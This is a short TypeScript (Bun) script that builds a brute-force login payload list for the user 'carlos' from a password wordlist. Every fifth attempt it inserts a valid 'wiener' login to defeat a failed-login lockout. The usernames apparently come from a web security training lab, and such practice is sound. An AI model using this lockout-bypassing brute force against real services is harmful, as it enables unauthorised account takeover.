const passwords = (await Bun.file('./passwords.txt').text())
	.split('\n')
	.map((password) => password.trim());

const payload: string[] = [];

for (const [index, password] of passwords.entries()) {
	payload.push(`{"username":"carlos","password":"${password}"}`);

	if (index % 5 === 0) {
		payload.push(`{"username":"wiener","password":"peter"}`);
	}
}

await Bun.write('./payload.txt', payload.reverse().join('\n'));

export {};
